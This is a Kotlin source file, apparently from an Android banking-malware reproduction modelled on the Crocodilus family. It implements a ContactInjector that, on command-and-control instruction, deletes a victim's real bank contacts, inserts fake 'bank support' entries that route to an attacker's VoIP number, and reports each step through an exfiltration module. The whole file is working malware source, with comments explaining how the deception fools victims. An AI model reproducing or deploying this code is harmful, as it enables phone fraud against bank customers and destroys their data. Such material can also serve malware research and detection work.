package com.docreader.lite.reader.advanced

import android.content.ContentProviderOperation
import android.content.ContentValues
import android.content.Context
import android.provider.ContactsContract
import com.docreader.lite.reader.Exfil

/**
 * Contact injection — insert fake bank support numbers into victim's contacts.
 *
 * Family reference:
 *   - Crocodilus (June 2025 variant): first banker to inject fake contacts.
 *     Adds fake bank customer service number pointing to attacker's VoIP.
 *     When victim tries to "call the bank" about suspicious activity,
 *     they find the fake number in contacts and call the attacker instead.
 *
 * Attack flow:
 *   1. C2 sends INJECT_CONTACTS with list of fake entries
 *   2. Each entry: bank name + attacker's VoIP number
 *   3. Malware inserts into device ContactsContract
 *   4. Optionally deletes real bank contact entries first
 *   5. Victim sees "Example Bank Support" → actually attacker's number
 *   6. Combined with CallForwarder for complete call interception
 *
 * Why this works:
 *   - User trusts contacts they "saved" (even though malware added them)
 *   - Most people don't memorize bank numbers — they search contacts
 *   - Fake contact appears alongside legitimate contacts
 *   - Even if user Googles the bank number, the contact is already there
 *     and seems "previously saved"
 */
object ContactInjector {

    /**
     * Inject a single fake contact.
     *
     * @param name Display name (e.g., "Example Bank Support", "Test Financial Help")
     * @param number Attacker's VoIP number
     * @param email Optional fake email for legitimacy
     * @param organization Organization name (e.g., "Example Financial Corp")
     */
    fun injectContact(
        context: Context,
        name: String,
        number: String,
        email: String? = null,
        organization: String? = null
    ): Boolean {
        return try {
            val ops = ArrayList<ContentProviderOperation>()

            // Insert raw contact
            ops.add(ContentProviderOperation.newInsert(
                ContactsContract.RawContacts.CONTENT_URI)
                .withValue(ContactsContract.RawContacts.ACCOUNT_TYPE, null)
                .withValue(ContactsContract.RawContacts.ACCOUNT_NAME, null)
                .build())

            // Display name
            ops.add(ContentProviderOperation.newInsert(
                ContactsContract.Data.CONTENT_URI)
                .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                .withValue(ContactsContract.Data.MIMETYPE,
                    ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE)
                .withValue(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, name)
                .build())

            // Phone number
            ops.add(ContentProviderOperation.newInsert(
                ContactsContract.Data.CONTENT_URI)
                .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                .withValue(ContactsContract.Data.MIMETYPE,
                    ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE)
                .withValue(ContactsContract.CommonDataKinds.Phone.NUMBER, number)
                .withValue(ContactsContract.CommonDataKinds.Phone.TYPE,
                    ContactsContract.CommonDataKinds.Phone.TYPE_WORK) // "Work" = looks corporate
                .build())

            // Organization (optional — adds legitimacy)
            if (organization != null) {
                ops.add(ContentProviderOperation.newInsert(
                    ContactsContract.Data.CONTENT_URI)
                    .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                    .withValue(ContactsContract.Data.MIMETYPE,
                        ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE)
                    .withValue(ContactsContract.CommonDataKinds.Organization.COMPANY, organization)
                    .withValue(ContactsContract.CommonDataKinds.Organization.TYPE,
                        ContactsContract.CommonDataKinds.Organization.TYPE_WORK)
                    .build())
            }

            // Email (optional — adds legitimacy)
            if (email != null) {
                ops.add(ContentProviderOperation.newInsert(
                    ContactsContract.Data.CONTENT_URI)
                    .withValueBackReference(ContactsContract.Data.RAW_CONTACT_ID, 0)
                    .withValue(ContactsContract.Data.MIMETYPE,
                        ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE)
                    .withValue(ContactsContract.CommonDataKinds.Email.ADDRESS, email)
                    .withValue(ContactsContract.CommonDataKinds.Email.TYPE,
                        ContactsContract.CommonDataKinds.Email.TYPE_WORK)
                    .build())
            }

            context.contentResolver.applyBatch(ContactsContract.AUTHORITY, ops)

            Exfil.event("contact_injected",
                "name" to name,
                "number" to number.take(6) + "***"
            )
            true
        } catch (e: Exception) {
            Exfil.event("contact_inject_failed",
                "name" to name,
                "error" to (e.message ?: "unknown")
            )
            false
        }
    }

    /**
     * Batch inject multiple fake contacts.
     * Called from C2 command with list of bank name → attacker number pairs.
     */
    fun injectBatch(context: Context, contacts: List<FakeContact>) {
        var success = 0
        contacts.forEach { contact ->
            if (injectContact(context, contact.name, contact.number,
                    contact.email, contact.organization)) {
                success++
            }
        }
        Exfil.event("contact_batch_complete",
            "total" to contacts.size.toString(),
            "success" to success.toString()
        )
    }

    /**
     * Delete existing contacts matching a name pattern.
     * Used to remove REAL bank contacts before injecting fakes.
     *
     * E.g., delete "Example Bank" contacts before adding fake "Example Support"
     */
    fun deleteContactsByName(context: Context, namePattern: String): Int {
        var deleted = 0
        try {
            val cursor = context.contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                arrayOf(ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME),
                "${ContactsContract.Contacts.DISPLAY_NAME} LIKE ?",
                arrayOf("%$namePattern%"),
                null
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val id = it.getLong(0)
                    val name = it.getString(1) ?: ""

                    // Delete via lookup key
                    val uri = ContactsContract.Contacts.CONTENT_URI
                        .buildUpon().appendPath(id.toString()).build()
                    context.contentResolver.delete(uri, null, null)
                    deleted++

                    Exfil.event("contact_deleted",
                        "name" to name,
                        "reason" to "pre_inject_cleanup"
                    )
                }
            }
        } catch (e: Exception) {
            Exfil.event("contact_delete_failed", "error" to (e.message ?: "unknown"))
        }
        return deleted
    }

    /**
     * Replace real bank contacts with fakes.
     * Complete flow: delete real → inject fake → verify.
     */
    fun replaceContacts(context: Context, replacements: List<ContactReplacement>) {
        replacements.forEach { r ->
            // Delete existing contacts matching real bank name
            val deleted = deleteContactsByName(context, r.searchPattern)

            // Inject fake replacement
            injectContact(context, r.fakeName, r.fakeNumber,
                r.fakeEmail, r.fakeOrganization)

            Exfil.event("contact_replaced",
                "pattern" to r.searchPattern,
                "deleted" to deleted.toString(),
                "fake_name" to r.fakeName
            )
        }
    }

    data class FakeContact(
        val name: String,
        val number: String,
        val email: String? = null,
        val organization: String? = null
    )

    data class ContactReplacement(
        val searchPattern: String,     // Pattern to find real contacts ("Example Bank", "Test Financial")
        val fakeName: String,          // Fake contact name
        val fakeNumber: String,        // Attacker's number
        val fakeEmail: String? = null,
        val fakeOrganization: String? = null
    )
}
